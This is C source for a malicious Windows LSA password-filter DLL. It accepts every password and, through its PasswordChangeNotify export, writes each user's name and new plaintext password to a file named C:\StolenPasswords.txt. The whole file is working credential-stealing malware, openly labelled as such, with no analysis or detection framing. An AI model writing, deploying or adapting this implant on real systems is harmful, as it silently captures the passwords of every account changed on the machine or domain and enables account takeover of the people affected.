#include <windows.h>

// define PUNICODE_STRING on our own instead of #include <ntsecapi.h>
typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;


// Initialization of password filter. Just returns TRUE to let LSA know everything went fine. 
__declspec(dllexport)
BOOLEAN
__stdcall
InitializeChangeNotify(void)
{
	return TRUE;
}

// This function is called by LSA when password is successfully changed
// Let's write it to the file
__declspec(dllexport)
NTSTATUS
__stdcall
PasswordChangeNotify(
	PUNICODE_STRING UserName,
	ULONG RelativeId,
	PUNICODE_STRING NewPassword
)
{
	DWORD dwWritten;
	HANDLE hFile;

	hFile = CreateFile(L"C:\\StolenPasswords.txt",
		GENERIC_WRITE,            // open for writing
		0,                        // no other access allowed for a moment
		NULL,                     // no security
		OPEN_ALWAYS,              // open or create
		FILE_ATTRIBUTE_NORMAL,    // normal file
		NULL);                    // no attr. template

	if (hFile != INVALID_HANDLE_VALUE)
	{
		SetFilePointer(hFile, 0, NULL, FILE_END); // let's move pointer as CreateFile sets it at 0

		WriteFile(hFile, UserName->Buffer, UserName->Length, &dwWritten, 0);
		WriteFile(hFile, L" -> ", 8, &dwWritten, 0); // be careful with hardcoded length
		WriteFile(hFile, NewPassword->Buffer, NewPassword->Length, &dwWritten, 0);
		WriteFile(hFile, L"\r\n", 4, &dwWritten, 0); // be careful with hardcoded length

		CloseHandle(hFile);
	}
	return 0; //STATUS_SUCCESS
}


// This function validates a new password
// Our DLL returns TRUE to let LSA know password is OK
__declspec(dllexport)
BOOLEAN
__stdcall
PasswordFilter(
	PUNICODE_STRING AccountName,
	PUNICODE_STRING FullName,
	PUNICODE_STRING Password,
	BOOLEAN SetOperation
)
{
	return TRUE;
}
